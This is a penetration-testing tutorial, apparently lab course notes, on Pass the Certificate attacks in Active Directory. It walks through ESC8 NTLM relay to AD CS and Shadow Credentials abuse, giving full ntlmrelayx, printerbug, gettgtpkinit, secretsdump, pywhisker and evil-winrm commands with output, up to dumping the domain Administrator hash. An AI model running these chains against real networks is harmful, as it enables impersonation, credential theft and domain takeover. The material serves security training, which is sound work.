# Pass the Certificate

## Table of Contents

- [What's actually going on here](#whats-actually-going-on-here)
- [Method 1: ESC8 — NTLM Relay Against AD CS](#method-1-esc8--ntlm-relay-against-ad-cs)
- [Method 2: Shadow Credentials](#method-2-shadow-credentials)

---

## What's actually going on here

We've covered Pass the Hash and Pass the Ticket. This guide covers a third variation: **Pass the Certificate** — using an **X.509 certificate** (the same kind of thing used for HTTPS, smart cards, etc.) to obtain a valid Kerberos TGT.

This is possible because of **PKINIT** (Public Key Cryptography for Initial Authentication) — a Kerberos extension that lets someone authenticate using a certificate/public key instead of a password. It's the mechanism behind smart-card logins in enterprise environments. If an attacker can get hold of — or trick a system into issuing them — a valid certificate for an account, that certificate can be exchanged for a real TGT, putting us right back in familiar Pass the Ticket territory.

Two main ways attackers get their hands on a usable certificate:
1. **Abusing AD CS** (Active Directory Certificate Services) misconfigurations — specifically the **ESC8** attack covered here
2. **Shadow Credentials** — abusing a specific AD attribute to add your own certificate to someone else's account

---

## Method 1: ESC8 — NTLM Relay Against AD CS

> This is a deep topic with its own dedicated module elsewhere — here's the simplified version of how the attack chain works.

### The vulnerability

**AD CS** (the service that issues certificates in a Windows domain) supports several ways to request a certificate, including **web enrollment** — a browser-based interface, which by default runs over plain **HTTP** at a URL like `/certsrv`. Because it's unencrypted HTTP, it's vulnerable to **NTLM relay attacks**: if we can capture a machine's authentication attempt and relay it to this web enrollment endpoint, the service will dutifully issue a certificate *for that machine* — to us.

<img width="1020" height="413" alt="image" src="https://github.com/user-attachments/assets/0065040c-1a7b-48cb-a14d-02034fad5323" />

### Step 1: Set up the relay listener

**Impacket's ntlmrelayx** listens for incoming authentication attempts and forwards (relays) them to the AD CS web enrollment service:

```bash
$ impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

- `--template` specifies which certificate template to request — this varies by environment and can be enumerated beforehand with a tool like [Certipy](https://github.com/ly4k/Certipy).

### Step 2: Force a machine to authenticate to us

Rather than waiting around for someone to connect to us naturally, we can actively **coerce** authentication using the [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) — a known quirk in the Print Spooler service that can be abused to force a machine account to authenticate to an arbitrary host.

```bash
$ python3 printerbug.py EVILCORP.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
```

```
[*] Attempting to trigger authentication via rprn RPC at 10.129.234.109
[*] Triggered RPC backconnect, this may or may not have worked
```

This tells the target (`10.129.234.109`, a Domain Controller) to attempt authentication back against **our** machine (`10.10.16.12`) — exactly the connection our relay listener is waiting for.

### Step 3: Watch the relay succeed

```
[*] Received connection from 10.129.234.109, attacking target http://10.129.234.110
[*] Authenticating against http://10.129.234.110 as EVILCORP/DC01$ SUCCEED
[*] Generating CSR...
[*] GOT CERTIFICATE! ID 8
[*] Writing PKCS#12 certificate to ./DC01$.pfx
```

The Domain Controller's own authentication attempt got relayed straight into a legitimate certificate request — and we now hold a valid certificate (`DC01$.pfx`) for the **Domain Controller's own machine account**. That's about as high-value a target as it gets.

### Step 4: Trade the certificate for a TGT

[gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) (part of the PKINITtools project) converts a certificate into an actual Kerberos ticket:

```bash
$ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
$ python3 -m venv .venv && source .venv/bin/activate
$ pip3 install -r requirements.txt
```

Then, we can begin the attack.

> **Note:** If you encounter error stating `"Error detecting the version of libcrypto"`, it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library.

```bash
$ python3 gettgtpkinit.py -cert-pfx DC01\$.pfx -dc-ip 10.129.234.109 'evilcorp.local/dc01$' /tmp/dc.ccache
```

```
Requesting TGT
AS-REP encryption key: 3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
Saved TGT to file
```

A fully valid TGT for `DC01$`, saved as a standard Linux ccache file — this is now a Pass the Ticket scenario exactly like the ones covered earlier.

### Step 5: Cash in the ticket — DCSync as the Domain Controller itself

Since we're now authenticated as the Domain Controller's own machine account, we have the privileges needed to perform a **DCSync** attack — essentially asking the domain to replicate credential data to us, as if we were another Domain Controller.

```bash
$ export KRB5CCNAME=/tmp/dc.ccache
$ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'EVILCORP.LOCAL/DC01$'@DC01.EVILCORP.LOCAL
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:...:::
```

Full domain compromise — the Administrator's NT hash, obtained without ever touching NTDS.dit directly, purely by chaining an NTLM relay → a stolen certificate → a forged TGT → a DCSync request.

---

## Method 2: Shadow Credentials

This technique doesn't rely on an AD CS misconfiguration at all — instead, it abuses a specific Active Directory **user attribute**.

### The attribute being abused

Every AD user object has an attribute called **`msDS-KeyCredentialLink`**, which stores public keys usable for PKINIT authentication (this is the modern mechanism behind Windows Hello for Business, among other things). If you have **write permission** over someone else's `msDS-KeyCredentialLink` attribute, you can add your *own* certificate's public key to their account — effectively giving yourself a valid login method for that user, without ever touching their password.

> **Spotting this opportunity:** in BloodHound, a permission edge called `AddKeyCredentialLink` specifically flags when one user has write access to another's `msDS-KeyCredentialLink` — this is the exact misconfiguration this attack exploits.

### Step 1: Generate a certificate and attach it to the victim's account

[pywhisker](https://github.com/ShutdownRepo/pywhisker) automates the whole process:

```bash
$ pywhisker --dc-ip 10.129.234.109 -d EVILCORP.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```

```
[*] Target user found: CN=Jesse Pinkman,...
[*] Generating certificate
[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
[*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
```

In one command: a new certificate was generated, its public key was silently written into the victim's `msDS-KeyCredentialLink` attribute, and we got back a password-protected `.pfx` certificate file we can now authenticate with.

### Step 2: Trade the certificate for a TGT (same process as before)

```bash
$ python3 gettgtpkinit.py -cert-pfx eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 EVILCORP.LOCAL/jpinkman /tmp/jpinkman.ccache
```

```
Requesting TGT
Saved TGT to file
```

### Step 3: Use the stolen identity

```bash
$ export KRB5CCNAME=/tmp/jpinkman.ccache
$ klist
```
```
Default principal: jpinkman@EVILCORP.LOCAL
Service principal: krbtgt/EVILCORP.LOCAL@EVILCORP.LOCAL
```

We're now fully authenticated as `jpinkman` — never having touched his real password at any point.

In this example, it turned out `jpinkman` is a member of the **Remote Management Users** group — meaning WinRM access is possible:

```bash
$ evil-winrm -i dc01.evilcorp.local -r evilcorp.local
```
```
*Evil-WinRM* PS C:\Users\jpinkman\Documents> whoami
evilcorp\jpinkman
```

---

## Quick Recap

| Technique | What it exploits | End result |
|-----------|----------------------|----------------|
| **ESC8** (AD CS NTLM relay) | HTTP-based certificate web enrollment + NTLM relay | A certificate for the relayed account (e.g., a Domain Controller) |
| **Shadow Credentials** | Write access to a user's `msDS-KeyCredentialLink` attribute | A certificate for that specific victim user |
| **Both →** `gettgtpkinit.py` | Trades a certificate for a real Kerberos TGT | A reusable ticket → standard Pass the Ticket access |

**Key idea:** Pass the Certificate is really a bridge technique — it's about *getting* a certificate (whether by relaying someone else's authentication through a vulnerable AD CS endpoint, or by abusing write permissions on an AD attribute), and then converting that certificate into a Kerberos ticket via PKINIT. From there, everything folds right back into the same Pass the Ticket toolkit covered in the previous guides — making this a powerful way to escalate from a relatively minor misconfiguration (an open permission, or an HTTP certificate endpoint) all the way to full domain compromise.
